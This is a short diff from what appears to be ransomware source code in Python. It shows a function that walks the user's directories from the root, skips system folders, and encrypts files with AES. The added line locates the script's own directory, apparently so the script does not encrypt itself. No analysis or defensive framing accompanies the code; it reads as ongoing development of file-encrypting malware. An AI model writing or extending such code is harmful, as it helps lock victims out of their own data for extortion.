@@ -71,6 +71,7 @@ def encrypt_file_with_aes(file_path, key):
 
 def encrypt_user_files(aes_key):
     root_path = root_paths()
+    script_dir = os.path.dirname(os.path.abspath(__file__))  # Get the scripts directory
 
     for root, dirs, files in os.walk(root_path):
         if any(exclude in root for exclude in system_desktop_dirs):
